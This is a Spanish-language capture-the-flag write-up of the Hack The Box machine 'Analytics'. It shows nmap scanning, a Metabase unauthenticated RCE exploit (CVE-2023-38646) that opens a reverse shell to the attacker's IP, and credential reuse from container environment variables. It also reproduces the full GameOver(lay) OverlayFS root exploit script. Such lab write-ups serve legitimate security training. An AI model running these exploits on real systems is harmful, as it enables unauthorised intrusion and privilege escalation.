---
layout: post
title: HTB Analytics
date: '2023-11-05 16:50:41 -0500'
categories: [HTB, Easy]
tags: [Web, CVE, Linux, RCE, Ubuntu, Docker] 
author: MadLies    
image:
  path: /analytics/preview.jpeg
  alt: Analytics
---

## Resumen

![logo](/analytics/analyt.png){: .right w="200" h="200" }

**Analytics** es una máquina que consiste en abusar de un servicio web que se encuentra haciendo uso del software "Metabase," el cual es vulnerable a una ejecución remota de código (RCE) sin necesidad de autenticación. Una vez dentro de la máquina, se puede observar que se está ejecutando en un contenedor Docker, pero esto no es un problema, ya que las credenciales se encuentran almacenadas en texto plano. Por lo tanto, se puede obtener acceso a la máquina. Al revisar la versión del sistema operativo, se nota que el kernel es vulnerable. En mi opinión, es una gran máquina, fue divertida y bastante útil para practicar la enumeración de datos, la identificación de versiones y la búsqueda de exploits 


## Reconocimiento

Para empezar, se realiza un ping para saber con qué sistema operativo cuenta la máquina.

```bash
❯ ping  -c 1 10.10.11.233

PING 10.10.11.233 (10.10.11.233) 56(84) bytes of data.
64 bytes from 10.10.11.233: icmp_seq=1 ttl=63 time=154 ms

--- 10.10.11.233 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 154.311/154.311/154.311/0.000 ms
```
{: .nolineno }
Por lo que se puede asumir que el sistema operativo es ***Linux***.

## Escaneo de puertos

Ahora se puede realizar un escaneo con **nmap** para saber qué puertos se encuentran abiertos.

```bash 
❯ sudo nmap -p- --min-rate 2000 10.10.11.233 -oG openPorts -Pn -sS
```
{: .nolineno }
Y se encuentran abiertos los puertos 22 y 80. Por lo que se hace un escaneo mucho más profundo sobre ellos.


```bash
❯ sudo nmap -p80,20  -sVC 10.10.11.233 -Pn -sS -oN versions

PORT   STATE  SERVICE  VERSION
20/tcp closed ftp-data
80/tcp open   http     nginx 1.18.0 (Ubuntu)
|_http-title: Analytical
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno }
## Enumeración

Al ver que dentro del puerto 80 hay un sitio web, se puede intentar abrirlo para ver qué contiene, pero se encuentra relacionado al dominio **analytics.htb**, por lo que hay que guardarlo en el archivo **/etc/hosts**

![etchost](/analytics/etchosts.png)

```bash
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others

10.10.11.233 analytical.htb
```
{:.nolineno file="/etc/hosts" }

Después de arreglar eso, se puede ver un sitio web en el que existe un inicio de sesión.

![web](/analytics/web.png)

Pero al hacer clic en el botón, redirige a un nuevo subdominio llamado ***data***, por lo que es necesario agregarlo al archivo ***/etc/hosts***.

```bash
# Host addresses
127.0.0.1  localhost
127.0.1.1  parrot
::1        localhost ip6-localhost ip6-loopback
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
# Others
10.10.11.233 analytical.htb data.analytical.htb
```
{:.nolineno file="/etc/hosts" }

El inicio de sesión está haciendo uso de Metabase para la autenticación. Por lo que se puede investigar un poco más sobre él.

![login](/analytics/login.png)

> Metabase es la herramienta de análisis empresarial o business inteligente que se integra con nuestro software de gestión empresarial y que permite el análisis de la información de tu empresa. 
{: .prompt-info }

Por lo que se puede buscar algún **exploit** reciente para intentar ganar acceso a la aplicación, y Lo primero que aparece es la posibilidad de ejecutar comandos sin necesidad de estar autenticado.

![exploit](/analytics/exploit.png)

## Explotación

La descripción del **exploit** desarrollado por nickswink dice lo siguiente :

[CVE-2023-38646-exploit](https://github.com/nickswink/CVE-2023-38646#cve-2023-38646-exploit)

"This vulnerability, designated as CVE-2023–38646, allowed attackers to execute arbitrary commands on the server without requiring any authentication."

El método de ejecución es el siguiente:

```bash
python3 exploit.py <url> <local-ip> <local-port>
```
{: .nolineno}

```bash
python3 exploit.py http://data.analytical.htb/ 10.10.15.135 4444
```
{: .nolineno}

Y poniéndose a la escucha con `nc`

```bash
nc -lvp 4444
```
Se puede ganar una **Shell  Reversa**

```bash
b3190b9a602c:/$ whoami
whoami
metabase
b3190b9a602c:/$ hostname
hostname
b3190b9a602c
b3190b9a602c:/$ 
```
{: .nolineno}

Pero parece que se está dentro de un contenedor, por lo que se quiere escapar de él.


## Doker breakout

Al revisar las variables de entorno, se puede ver que existen algunas que parecen ser credenciales.

```bash
env

META_USER=metalytics
META_PASS=An4lytics_ds20223#
```
{: .nolineno}

Por lo que se puede intentar usarlas para conectarse por SSH al servidor.

```bash
❯ ssh metalytics@10.10.11.233
metalytics@10.10.11.233's password:An4lytics_ds20223#

metalytics@analytics:~$ whoami
metalytics
metalytics@analytics:~$ hostname
analytics
```
{: .nolineno}

## Escalada de privilegios

Al revisar información sobre el sistema operativo, se puede ver lo siguiente:


```bash
metalytics@analytics:~$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux
```
{: .nolineno}

Por lo que, al revisar si existe alguna forma de vulnerar la versión de Ubuntu, se encuentra que está relacionada con un fallo en overlayFS, que permite escalar privilegios.

Pero antes de explotar, ¿qué es OverlayFS?
>En informática, OverlayFS es una implementación de sistema de archivos de montaje de unión para Linux. Combina varios puntos de montaje subyacentes diferentes en uno, lo que da como resultado una estructura de directorio única que contiene archivos y subdirectorios subyacentes de todas las fuentes. 
{: .prompt-info }

Teniendo eso en mente, se encuentra la siguiente información en **GitHub**. sobre la vulnerabilidad llamada [GameOver(lay) Ubuntu Privilege Escalation](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629#gameoverlay-ubuntu-privilege-escalation)

#### [CVE-2023-2640](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629#cve-2023-2640)

[https://www.cvedetails.com/cve/CVE-2023-2640/](https://www.cvedetails.com/cve/CVE-2023-2640/)

> On Ubuntu kernels carrying both c914c0e27eb0 and "UBUNTU: SAUCE: overlayfs: Skip permission checking for trusted.overlayfs.* xattrs", an unprivileged user may set privileged extended attributes on the mounted files, leading them to be set on the upper files without the appropriate security checks.

#### [CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629#cve-2023-32629)

[https://www.cvedetails.com/cve/CVE-2023-32629/](https://www.cvedetails.com/cve/CVE-2023-32629/)

>Local privilege escalation vulnerability in Ubuntu Kernels overlayfs ovl_copy_up_meta_inode_data skip permission checks when calling ovl_do_setxattr on Ubuntu kernels.

### [Vulnerable kernels](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629#vulnerable-kernels)

|Kernel version|Ubuntu release|
|---|---|
|6.2.0|Ubuntu 23.04 (Lunar Lobster) / Ubuntu 22.04 LTS (Jammy Jellyfish)|
|5.19.0|Ubuntu 22.10 (Kinetic Kudu) / Ubuntu 22.04 LTS (Jammy Jellyfish)|
|5.4.0|Ubuntu 22.04 LTS (Local Fossa) / Ubuntu 18.04 LTS (Bionic Beaver)|

Todo esto gracias al GitHub de [g1vi](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629). 

Y al revisar las versiones exactas del host, se puede ver lo siguiente:

```bash
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
```
{: file="/etc/os-release"}

Por lo que se puede hacer uso del **exploit**, en este caso se copia el script dentro de la máquina para que no sea necesario transferir el archivo. 



```bash
#!/bin/bash

# CVE-2023-2640 CVE-2023-3262: GameOver(lay) Ubuntu Privilege Escalation
# by g1vi https://github.com/g1vi
# October 2023

echo "[+] You should be root now"
echo "[+] Type 'exit' to finish and leave the house cleaned"

unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```
{: .nolineno file="/tmp/exploit.sh"}

Se le da permisos de ejecución

```bash
chmod +x /tmp/exploit.sh
```
{: .nolineno} 

Y al ejecutarlo, se gana acceso como ***root***.


```bash
metalytics@analytics:/tmp$ bash exploit.sh 
[+] You should be root now
[+] Type 'exit' to finish and leave the house cleaned
root@analytics:/tmp# 
```
{: .nolineno}






